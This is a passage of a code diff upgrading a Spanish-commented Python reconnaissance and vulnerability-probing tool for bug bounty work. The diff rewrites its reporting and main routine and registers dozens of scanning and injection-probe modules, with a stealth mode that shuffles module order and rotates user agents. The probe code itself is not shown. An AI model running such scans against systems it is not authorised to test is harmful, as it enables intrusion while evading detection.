-                f.write(f"  {t['technology']} ({t['path']}) [{t['status']}]\n")
-            f.write("\n")
+        for module, data in ctx["results"].items():
+            f.write(f"\n--- {module.upper()} ---\n")
+            f.write(json.dumps(data, indent=2, default=str) + "\n")
 
-        # CMS
-        cms = results.get("cms_active", {})
-        if cms.get("cms"):
-            f.write(f"CMS: {cms['cms']}\n")
-            for d in cms.get("details", []):
-                f.write(f"  {d}\n")
-            f.write("\n")
-
-        # WAF
-        waf = results.get("waf_active", [])
-        if waf:
-            f.write("WAF DETECTED:\n")
-            for w in waf:
-                f.write(f"  {w['waf']} (indicator: {w['indicator']})\n")
-            f.write("\n")
-
-        # API Endpoints
-        apis = results.get("api_discovery", [])
-        if apis:
-            f.write("API ENDPOINTS:\n")
-            for a in apis:
-                f.write(f"  [{a['status']}] {a['path']}\n")
-            f.write("\n")
-
-        # Crawl Summary
-        crawl = results.get("crawl", {})
-        if crawl:
-            f.write("CRAWL SUMMARY:\n")
-            f.write(f"  Pages visited: {crawl.get('pages_visited', 0)}\n")
-            f.write(f"  Links found: {crawl.get('links_found', 0)}\n")
-            f.write(f"  Forms: {len(crawl.get('forms', []))}\n")
-            f.write(f"  JS files: {len(crawl.get('js_files', []))}\n")
-            if crawl.get("emails"):
-                f.write(f"  Emails: {', '.join(crawl['emails'][:10])}\n")
-            f.write("\n")
-
-        # Vulnerabilities
-        vulns = results.get("vulnerabilities", [])
-        if vulns:
-            f.write(f"{'='*60}\n")
-            f.write("VULNERABILITIES\n")
-            f.write(f"{'='*60}\n\n")
-            for v in vulns:
-                f.write(f"[{v['severity']}] {v['title']}\n")
-                f.write(f"  Description: {v['description']}\n")
-                f.write(f"  Remediation: {v['remediation']}\n\n")
+    # JSON Report
+    json_file = os.path.join(output_dir, f"active_recon_{domain}_{ts}.json")
+    report = {
+        "metadata": {
+            "tool": "Active Recon Tool v2.0",
+            "target": ctx["target_url"],
+            "domain": domain,
+            "mode": ctx["mode_config"]["name"],
+            "timestamp": datetime.now().isoformat(),
+            "modules_executed": list(ctx["results"].keys()),
+        },
+        "summary": severity_count,
+        "findings": all_findings,
+        "results": ctx["results"],
+    }
+    with open(json_file, "w") as f:
+        json.dump(report, f, indent=2, default=str)
 
     log_ok(f"Reporte TXT: {txt_file}")
-
-    # JSON report
-    json_file = os.path.join(output_dir, f"active_recon_{domain}_{timestamp}.json")
-    with open(json_file, "w") as f:
-        json.dump({
-            "target": target,
-            "timestamp": datetime.now().isoformat(),
-            "total_requests": rate_limiter.request_count if rate_limiter else 0,
-            "results": results,
-        }, f, indent=2, default=str)
-
     log_ok(f"Reporte JSON: {json_file}")
-    return txt_file, json_file
+    print()
+
+    # Print summary
+    total = sum(severity_count.values())
+    print(_c(C.BOLD, "  RESUMEN:"))
+    if severity_count["CRITICAL"]:
+        print(f"    {_c(C.R+C.BOLD, f'CRITICAL: {severity_count[\"CRITICAL\"]}')} ")
+    if severity_count["HIGH"]:
+        print(f"    {_c(C.R, f'HIGH: {severity_count[\"HIGH\"]}')} ")
+    if severity_count["MEDIUM"]:
+        print(f"    {_c(C.Y, f'MEDIUM: {severity_count[\"MEDIUM\"]}')} ")
+    if severity_count["LOW"]:
+        print(f"    {_c(C.B, f'LOW: {severity_count[\"LOW\"]}')} ")
+    print(f"    Total hallazgos: {total}")
+    print()
+
+
+# =====================================================================
+#  ALL MODULES REGISTRY
+# =====================================================================
+ALL_MODULES = {
+    "portscan":     ("Port Scanner",            mod_port_scan),
+    "services":     ("Service Detection",       mod_service_detect),
+    "zonetrans":    ("DNS Zone Transfer",       mod_zone_transfer),
+    "dnsrecon":     ("DNS Recon",               mod_dns_recon),
+    "dirbust":      ("Directory Bruteforce",    mod_dirbust),
+    "subbrust":     ("Subdomain Bruteforce",    mod_subdomain_brute),
+    "vhost":        ("VHost Discovery",         mod_vhost),
+    "crawl":        ("Web Crawler",             mod_crawler),
+    "paramdisco":   ("Parameter Discovery",     mod_param_discovery),
+    "apidisco":     ("API Discovery",           mod_api_discovery),
+    "sensitive":    ("Sensitive Files",          mod_sensitive_files),
+    "backup":       ("Backup Discovery",        mod_backup_discovery),
+    "techfp":       ("Tech Fingerprint",        mod_tech_fingerprint),
+    "waf":          ("WAF Detection",           mod_waf_detect),
+    "cmsenum":      ("CMS Enumeration",         mod_cms_enum),
+    "sslaudit":     ("SSL/TLS Audit",           mod_ssl_audit),
+    "httpmethods":  ("HTTP Methods",            mod_http_methods),
+    "secheaders":   ("Security Headers",        mod_security_headers),
+    "cookies":      ("Cookie Security",         mod_cookie_security),
+    "cors":         ("CORS Testing",            mod_cors_test),
+    "csp":          ("CSP Analysis",            mod_csp_analysis),
+    "clickjack":    ("Clickjacking Test",       mod_clickjacking),
+    "csrf":         ("CSRF Detection",          mod_csrf_detection),
+    "sqli":         ("SQL Injection",           mod_sqli),
+    "xss":          ("XSS Probe",               mod_xss),
+    "lfi":          ("LFI Probe",               mod_lfi),
+    "rfi":          ("RFI Probe",               mod_rfi),
+    "redirect":     ("Open Redirect",           mod_open_redirect),
+    "crlf":         ("CRLF Injection",          mod_crlf),
+    "hosthdr":      ("Host Header Injection",   mod_host_header),
+    "ssrf":         ("SSRF Detection",          mod_ssrf),
+    "ssti":         ("SSTI Detection",          mod_ssti),
+    "cmdi":         ("Command Injection",       mod_cmdi),
+    "xxe":          ("XXE Detection",           mod_xxe),
+    "hpp":          ("HTTP Param Pollution",    mod_hpp),
+    "takeover":     ("Subdomain Takeover",      mod_subdomain_takeover),
+    "defcreds":     ("Default Credentials",     mod_default_creds),
+    "jwt":          ("JWT Analysis",            mod_jwt_analysis),
+    "graphql":      ("GraphQL Testing",         mod_graphql),
+    "websocket":    ("WebSocket Testing",       mod_websocket),
+    "ratelimit":    ("Rate Limit Testing",      mod_rate_limit_test),
+    "infodiscl":    ("Info Disclosure",         mod_info_disclosure),
+    "emailinj":     ("Email Header Injection",  mod_email_injection),
+    "cloudmeta":    ("Cloud Metadata",          mod_cloud_metadata),
+}
 
 
 # =====================================================================
@@ -2579,238 +3035,206 @@ def generate_report(target, results, output_dir, rate_limiter=None):
 # =====================================================================
 def main():
     parser = argparse.ArgumentParser(
-        description="Active Reconnaissance Tool v1.0 - Bug Bounty Edition",
-        formatter_class=argparse.RawTextHelpFormatter,
-    )
-    parser.add_argument("-t", "--target", required=True,
-                        help="Target URL (ej: https://example.com)")
-    parser.add_argument("-m", "--modules", default="all",
-                        help="""Modulos a ejecutar (separados por coma):
-  portscan    - Escaneo de puertos TCP
-  services    - Deteccion de servicios/banners
-  dirbust     - Bruteforce de directorios
-  subbrust    - Bruteforce de subdominios
-  zonetrans   - DNS Zone Transfer
-  vhost       - Virtual host discovery
-  crawl       - Web spider/crawler
-  paramdisco  - Descubrimiento de parametros
-  techfp      - Technology fingerprinting
-  waf         - WAF detection
-  cmsenum     - CMS enumeration
-  sslaudit    - SSL/TLS audit
-  httpmethods - HTTP method testing
-  cors        - CORS testing
-  sqli        - SQL injection probe
-  xss         - XSS reflection probe
-  lfi         - Local file inclusion probe
-  redirect    - Open redirect probe
-  crlf        - CRLF injection probe
-  hosthdr     - Host header injection
-  takeover    - Subdomain takeover verify
-  defcreds    - Default credentials check
-  apidisco    - API endpoint discovery
-  all         - Todos los modulos (default)""")
-    parser.add_argument("-o", "--output", default=".",
-                        help="Directorio de salida para reportes (default: .)")
-    parser.add_argument("--threads", type=int, default=10,
-                        help="Threads para operaciones paralelas (default: 10)")
-    parser.add_argument("--timeout", type=int, default=10,
-                        help="Timeout HTTP en segundos (default: 10)")
-    parser.add_argument("--rate-limit", type=int, default=0,
-                        help="Max requests/segundo (0=sin limite, default: 0)")
-    parser.add_argument("--ports", default="top100",
-                        help="Puertos: top100, 1-1000, 1-65535, o lista (ej: 80,443,8080)")
-    parser.add_argument("--wordlist", default=None,
-                        help="Wordlist custom para dir bruteforce")
-    parser.add_argument("--sublist", default=None,
-                        help="Wordlist custom para subdomain bruteforce")
-    parser.add_argument("--extensions", default="php,html,txt,bak,old,asp,aspx,jsp",
-                        help="Extensiones para dir bruteforce (default: php,html,txt,bak,old,asp,aspx,jsp)")
-    parser.add_argument("--crawl-depth", type=int, default=3,
-                        help="Profundidad maxima de crawl (default: 3)")
-    parser.add_argument("--crawl-pages", type=int, default=100,
-                        help="Paginas maximas a crawlear (default: 100)")
-    parser.add_argument("--user-agent", default=None,
-                        help="User-Agent personalizado")
-    parser.add_argument("--proxy", default=None,
-                        help="Proxy HTTP (ej: http://127.0.0.1:8080 para Burp)")
-    parser.add_argument("--cookies", default=None,
-                        help="Cookies (ej: 'session=abc; token=xyz')")
-    parser.add_argument("--headers", default=None,
-                        help="Headers custom (separados por ;;, ej: 'Auth: Bearer x;; X-Custom: y')")
-    parser.add_argument("--no-color", action="store_true",
-                        help="Deshabilitar colores")
-    parser.add_argument("--skip-disclaimer", action="store_true",
-                        help="Saltar advertencia legal (solo para automation)")
+        description="Active Recon Tool v2.0 - Advanced Bug Bounty Edition",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Uso simple:
+  python3 active-recon.py https://target.com
+
+Con modo:
+  python3 active-recon.py https://target.com --mode slow
+  python3 active-recon.py https://target.com --mode medium
+  python3 active-recon.py https://target.com --mode high
+
+Modulos especificos:
+  python3 active-recon.py https://target.com -m sqli,xss,lfi
+""")
+    parser.add_argument("target", nargs="?", help="URL del target")
+    parser.add_argument("-t", "--target-flag", dest="target_alt", help="URL del target (alternativa)")
+    parser.add_argument("--mode", choices=["slow","medium","high"], help="Modo de velocidad")
+    parser.add_argument("-m", "--modules", help="Modulos a ejecutar (separados por coma)")
+    parser.add_argument("-o", "--output", default=".", help="Directorio de reportes")
+    parser.add_argument("--threads", type=int, help="Override hilos (default segun modo)")
+    parser.add_argument("--timeout", type=int, default=10, help="Timeout HTTP (default: 10)")
+    parser.add_argument("--ports", default="top100", help="top100 | rango (1-1000) | lista (80,443)")
+    parser.add_argument("--wordlist", help="Wordlist custom para directorios")
+    parser.add_argument("--sublist", help="Wordlist custom para subdominios")
+    parser.add_argument("--extensions", default="php,html,txt,bak,old,asp,aspx,jsp,json,xml,yml,yaml,conf,cfg,ini,log,sql,zip,tar.gz,rar")
+    parser.add_argument("--crawl-depth", type=int, default=3)
+    parser.add_argument("--crawl-pages", type=int, default=100)
+    parser.add_argument("--user-agent", help="User-Agent custom")
+    parser.add_argument("--proxy", help="Proxy HTTP (ej: http://127.0.0.1:8080)")
+    parser.add_argument("--cookies", help="Cookies (ej: session=abc; token=xyz)")
+    parser.add_argument("--headers", help="Headers custom (separados por ;;)")
+    parser.add_argument("--no-color", action="store_true")
+    parser.add_argument("--skip-disclaimer", action="store_true", help="Saltar disclaimer (solo automation)")
 
     args = parser.parse_args()
+
+    # Handle target
+    target = args.target or args.target_alt
+    if not target:
+        parser.print_help()
+        sys.exit(1)
+
+    # Normalize URL
+    if not target.startswith(("http://", "https://")):
+        target = f"https://{target}"
 
     global NO_COLOR
     NO_COLOR = args.no_color
 
     banner()
 
-    # Show disclaimer
+    # Disclaimer
     if not args.skip_disclaimer:
         show_disclaimer()
 
-    target = args.target
-    if not target.startswith("http"):
-        target = f"https://{target}"
-
-    parsed = urlparse(target)
-    domain = parsed.hostname
-    if not domain:
-        log_fail("URL invalida.")
-        sys.exit(1)
-
-    base_url = get_base_url(target)
-    target_ip = resolve_host(domain)
-
-    if NO_COLOR:
-        print(f"  Target: {target}")
-        print(f"  Domain: {domain}")
-        print(f"  IP: {target_ip or 'N/A'}")
+    # Mode selection
+    if args.mode:
+        mode = args.mode
     else:
-        print(f"  {C.BOLD}Target:{C.X} {target}")
-        print(f"  {C.BOLD}Domain:{C.X} {domain}")
-        print(f"  {C.BOLD}IP:{C.X} {target_ip or 'N/A'}")
-    print()
+        mode = select_mode_interactive()
 
-    if not target_ip:
-        log_fail(f"No se puede resolver {domain}")
-        sys.exit(1)
-
-    # Setup
-    session = create_session(args.user_agent, args.proxy, args.cookies, args.headers, args.timeout)
-    rate_limiter = RateLimiter(args.rate_limit)
-    results = {}
-    os.makedirs(args.output, exist_ok=True)
-
-    # Parse modules
-    selected = set()
-    if args.modules == "all":
-        selected = {"portscan", "services", "dirbust", "subbrust", "zonetrans",
-                    "vhost", "crawl", "paramdisco", "techfp", "waf", "cmsenum",
-                    "sslaudit", "httpmethods", "cors", "sqli", "xss", "lfi",
-                    "redirect", "crlf", "hosthdr", "takeover", "defcreds", "apidisco"}
-    else:
-        selected = set(m.strip() for m in args.modules.split(","))
+    mode_config = SPEED_MODES[mode]
+    print(f"\n  {_c(C.G+C.BOLD, f'Modo seleccionado: {mode_config[\"name\"]}')}")
+    print(f"  {_c(C.D, mode_config['desc'])}\n")
 
     # Parse ports
     ports = TOP_PORTS
     if args.ports != "top100":
         if "-" in args.ports:
             start, end = args.ports.split("-")
-            ports = list(range(int(start), int(end) + 1))
+            ports = list(range(int(start), int(end)+1))
         else:
             ports = [int(p) for p in args.ports.split(",")]
 
-    # Parse wordlists
-    dir_wordlist = DIR_WORDLIST
+    # Threads (mode default or override)
+    threads = args.threads or mode_config["threads"]
+
+    # Rate limiter
+    rate_limiter = RateLimiter(mode_config)
+
+    # Session
+    session = create_session(
+        user_agent=args.user_agent,
+        proxy=args.proxy,
+        cookies=args.cookies,
+        headers=args.headers,
+        timeout=args.timeout,
+        rotate_ua=mode_config["rotate_ua"],
+    )
+
+    # Custom wordlists
+    custom_wordlist = None
     if args.wordlist and os.path.isfile(args.wordlist):
         with open(args.wordlist) as f:
-            dir_wordlist = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-
-    sub_wordlist = SUB_WORDLIST
+            custom_wordlist = [l.strip() for l in f if l.strip()]
+    custom_sublist = None
     if args.sublist and os.path.isfile(args.sublist):
         with open(args.sublist) as f:
-            sub_wordlist = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+            custom_sublist = [l.strip() for l in f if l.strip()]
 
-    extensions = [e.strip() for e in args.extensions.split(",")]
+    # Parse target
+    parsed = urlparse(target)
+    domain = parsed.hostname
+    target_host = resolve_host(domain)
+
+    if not target_host:
+        print(f"\n  {_c(C.R, f'[!] No se pudo resolver: {domain}')}")
+        sys.exit(1)
+
+    log_info(f"Target: {target}")
+    log_info(f"Domain: {domain}")
+    log_info(f"IP: {target_host}")
+    log_info(f"Mode: {mode_config['name']}")
+    log_info(f"Threads: {threads}")
+    if args.proxy:
+        log_info(f"Proxy: {args.proxy}")
+    print()
+
+    # Context object - shared state across all modules
+    ctx = {
+        "target_url": target,
+        "target_host": target_host,
+        "domain": domain,
+        "base_url": get_base_url(target),
+        "session": session,
+        "rate_limiter": rate_limiter,
+        "mode_config": mode_config,
+        "threads": threads,
+        "timeout": args.timeout,
+        "ports": ports,
+        "output_dir": args.output,
+        "custom_wordlist": custom_wordlist,
+        "custom_sublist": custom_sublist,
+        "extensions": args.extensions,
+        "crawl_depth": args.crawl_depth,
+        "crawl_pages": args.crawl_pages,
+        "results": {},
+        "_crawled_links": set(),
+        "_crawled_forms": [],
+        "_crawled_params": set(),
+    }
+
+    # Determine which modules to run
+    if args.modules:
+        module_keys = [m.strip() for m in args.modules.split(",")]
+    else:
+        module_keys = list(ALL_MODULES.keys())
+
+    # Randomize order for stealth
+    if mode_config["randomize"] and not args.modules:
+        # Keep some logical ordering but shuffle within groups
+        groups = [
+            ["portscan","services"],
+            ["zonetrans","dnsrecon"],
+            ["dirbust","subbrust","vhost"],
+            ["crawl","paramdisco","apidisco"],
+            ["sensitive","backup"],
+            ["techfp","waf","cmsenum"],
+            ["sslaudit","httpmethods","secheaders","cookies"],
+            ["cors","csp","clickjack","csrf"],
+            ["sqli","xss","lfi","rfi","redirect","crlf","hosthdr"],
+            ["ssrf","ssti","cmdi","xxe","hpp"],
+            ["takeover","defcreds","jwt","graphql","websocket"],
+            ["ratelimit","infodiscl","emailinj","cloudmeta"],
+        ]
+        module_keys = []
+        for group in groups:
+            g = [m for m in group if m in ALL_MODULES]
+            random.shuffle(g)
+            module_keys.extend(g)
+
+    # Print modules to execute
+    valid_modules = [m for m in module_keys if m in ALL_MODULES]
+    log_info(f"Ejecutando {len(valid_modules)} modulos...")
+    print()
 
     start_time = time.time()
 
-    try:
-        # === EXECUTION ORDER ===
-
-        if "portscan" in selected:
-            mod_port_scan(target_ip, ports, args.threads, args.timeout, rate_limiter, results)
-
-        if "services" in selected and results.get("open_ports"):
-            mod_service_detect(target_ip, results["open_ports"], args.timeout, results)
-
-        if "sslaudit" in selected and parsed.scheme == "https":
-            mod_ssl_audit(domain, parsed.port or 443, results)
-
-        if "subbrust" in selected:
-            mod_subdomain_brute(domain, sub_wordlist, args.threads, rate_limiter, results)
-
-        if "zonetrans" in selected and dns:
-            mod_dns_zone_transfer(domain, results)
-
-        if "vhost" in selected and target_ip:
-            mod_vhost_discover(session, target_ip, base_url, domain, sub_wordlist[:50], rate_limiter, results)
-
-        if "waf" in selected:
-            mod_waf_detect(session, base_url, rate_limiter, results)
-
-        if "techfp" in selected:
-            mod_tech_fingerprint(session, base_url, rate_limiter, results)
-
-        if "cmsenum" in selected:
-            mod_cms_enum(session, base_url, rate_limiter, results)
-
-        if "httpmethods" in selected:
-            mod_http_methods(session, base_url, rate_limiter, results)
-
-        if "cors" in selected:
-            mod_cors_test(session, base_url, rate_limiter, results)
-
-        if "crawl" in selected:
-            mod_crawl(session, base_url, args.crawl_depth, args.crawl_pages, rate_limiter, results)
-
-        crawl_results = results.get("crawl", {})
-
-        if "dirbust" in selected:
-            mod_dir_bruteforce(session, base_url, dir_wordlist, args.threads, extensions, rate_limiter, results)
-
-        if "apidisco" in selected:
-            mod_api_discover(session, base_url, args.threads, rate_limiter, results)
-
-        if "paramdisco" in selected:
-            mod_param_discover(session, base_url, PARAM_WORDLIST, rate_limiter, results)
-
-        if "defcreds" in selected:
-            mod_default_creds(session, base_url, rate_limiter, results)
-
-        if "hosthdr" in selected:
-            mod_header_inject(session, base_url, rate_limiter, results)
-
-        if "crlf" in selected:
-            mod_crlf_probe(session, base_url, rate_limiter, results)
-
-        if "redirect" in selected:
-            mod_redirect_probe(session, base_url, crawl_results, rate_limiter, results)
-
-        if "sqli" in selected:
-            mod_sqli_probe(session, base_url, crawl_results, rate_limiter, results)
-
-        if "xss" in selected:
-            mod_xss_probe(session, base_url, crawl_results, rate_limiter, results)
-
-        if "lfi" in selected:
-            mod_lfi_probe(session, base_url, crawl_results, rate_limiter, results)
-
-        if "takeover" in selected and results.get("subdomains_brute"):
-            mod_takeover_verify(session, results["subdomains_brute"], rate_limiter, results)
-
-        # Vulnerability Assessment
-        mod_vuln_assessment(results)
-
-        # Report
-        generate_report(target, results, args.output, rate_limiter)
-
-    except KeyboardInterrupt:
-        print(f"\n\n  {C.Y}[!] Escaneo interrumpido por el usuario.{C.X}")
-        if results:
-            generate_report(target, results, args.output, rate_limiter)
+    # Execute modules
+    for mod_key in valid_modules:
+        name, func = ALL_MODULES[mod_key]
+        try:
+            func(ctx)
+        except KeyboardInterrupt:
+            log_warn("Interrumpido por usuario. Generando reporte parcial...")
+            break
+        except Exception as e:
+            log_fail(f"Error en modulo {name}: {e}")
 
     elapsed = time.time() - start_time
-    print(f"\n  {C.BOLD}Tiempo total:{C.X} {elapsed:.1f}s")
-    print(f"  {C.BOLD}Total requests:{C.X} {rate_limiter.request_count}")
-    print()
+    log_info(f"\nEscaneo completado en {elapsed:.1f} segundos")
+    log_info(f"Total requests: {rate_limiter.request_count}")
+
+    # Generate report
+    generate_report(ctx)
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n  {_c(C.Y, '[!] Interrumpido.')}")
+        sys.exit(0)
